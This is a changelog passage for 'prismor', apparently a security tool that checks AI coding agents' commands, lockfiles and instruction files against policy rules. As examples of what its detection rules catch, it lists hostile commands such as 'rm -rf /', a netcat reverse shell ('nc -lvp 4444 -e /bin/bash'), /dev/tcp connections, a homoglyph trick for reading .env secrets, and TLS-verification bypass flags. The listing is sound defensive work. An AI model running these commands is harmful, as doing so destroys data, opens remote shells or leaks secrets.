- **Lockfile integrity audit** — `prismor deps` now detects non-registry
  sources (`git+`, `file:`) in `package-lock.json`, missing `integrity:`
  hashes, and lockfile-injection (direct deps in the lockfile that aren't
  declared in `package.json`). (`prismor/runtime/deps.py::check_lockfile_integrity`)
- **Agent instruction-file tamper detection** — new `agent-instruction-tampering`
  rule covers `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.windsurfrules`,
  `.github/copilot-instructions.md`. Previously only `.claude/settings.json`
  was protected. (`prismor/runtime/default_policy.yaml`)
- **Unicode / homoglyph path detection** — flags paths and commands that mix
  ASCII letters with Cyrillic, Greek, Latin-extended confusables, fullwidth
  letters, and zero-width joiners (e.g. `cat .еnv` where `е` is U+0435).
  (`prismor/runtime/policy_engine.py::_has_suspicious_unicode`)
- **Telemetry sinks** — new `settings.outputs` section in `policy.yaml`
  forwards findings to webhook, syslog (UDP/TCP), and file sinks. File sink
  supports both JSON and ArcSight CEF formats for SIEM ingest. Env-var
  interpolation (`${SIEM_TOKEN}`) for secret headers. (`prismor/runtime/sinks.py`)
- **Declarative policy tests** — `prismor policy test` runs
  `.prismor/policy-tests.yaml` cases (`{input, expect: block|warn|pass}`)
  and ships a bundled OWASP LLM Top 10 + Agentic Top 10 + MITRE ATLAS
  starter pack (28 cases). (`prismor/runtime/policy_test.py`,
  `templates/policy-tests-owasp.yaml`)
- **`prismor check --explain`** — shows matched rule's category, action,
  event types, field list, and full regex pattern.
- **`prismor check --from-log PATH`** — replay a JSONL session log through the
  current policy to validate rule changes.
- **`prismor check --suggest-allowlist`** — emits a ready-to-paste
  `allowlists:` entry when a command triggers a finding the user considers
  intentional.

### Changed

- **Destructive-command rule** now accepts positional arguments with
  optional quotes (`rm -rf "/etc"`), catches separate flags (`rm -r -f /`)
  and long-form (`rm --recursive --force /`), while still passing safe
  cleanup (`rm -rf ./node_modules`, `rm -rf /tmp/build`, `rm -rf ../build`).
- **Reverse-shell rule** catches `nc -lvp 4444 -e /bin/bash` (combined
  listen+port flag) in addition to the separate `-l` / `-p` form.
- **`/dev/tcp/<host>`** now matches any hostname, not just dotted-quad IPs.
- **TLS verification bypass** rule extended: `git -c http.sslVerify=false`
  inline override, `curl -sk` / `-ksL` / `-Lk` combined flags.
- **npm supply-chain** rules: `--registry` flag matched regardless of
  position (before or after `install|i|add`); yarn/pnpm parity.
- **Shell-obfuscation** rule now matches `perl pack(q{H*}, …)` alternate
  Perl quoting forms in addition to classic `pack("H*", …)`.

### Infrastructure

- `prismor deps` now prints a dedicated "Lockfile integrity issues"
  section and exits `1` when a HIGH-severity integrity issue is present.
- `prismor canary remove` by id or path; `prismor canary status` summarises
  registered canaries by type.
- `prismor hook-dispatch` now invokes telemetry sinks BEFORE the blocking
  decision so SIEMs see every event, including blocked ones.

### Tests

- 227 unit tests, all passing (no regression since 0.2.0).
- 28/28 OWASP starter policy-test cases pass on a clean install.
- Lightsail regression matrix: 97/97 adversarial and golden-path cases
  green (same matrix that validated PR #19).

## [0.2.0] — 2026-04-21

First comprehensive audit-fix release — see PR #19 in the GitHub repo for
details. Closes 15 detection/lifecycle gaps identified by external review
plus six adversarial bypass variations surfaced during variation testing.
